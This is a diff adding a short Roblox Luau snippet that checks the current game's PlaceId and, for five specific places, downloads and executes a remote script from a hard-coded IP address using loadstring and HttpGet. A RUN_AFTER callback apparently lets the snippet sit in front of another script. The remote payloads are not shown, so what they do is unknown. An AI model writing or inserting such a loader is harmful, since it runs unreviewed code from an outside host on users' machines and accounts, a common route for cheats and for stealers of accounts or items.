@@ -1,0 +1,15 @@
+if game.PlaceId ~= 96342491571673 and game.PlaceId ~= 109983668079237 and RUN_AFTER then
+    task.spawn(RUN_AFTER)
+end
+
+if game.PlaceId == 126884695634066 then
+     loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/gag.luau"))()
+elseif game.PlaceId == 142823291 then
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/mm2.luau"))()
+elseif game.PlaceId == 920587237 then
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/ame.luau"))()
+elseif game.PlaceId == 127742093697776 then
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/pvb.luau"))()
+elseif game.PlaceId == 96342491571673 or game.PlaceId == 109983668079237 then
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/sab.luau"))()
+end
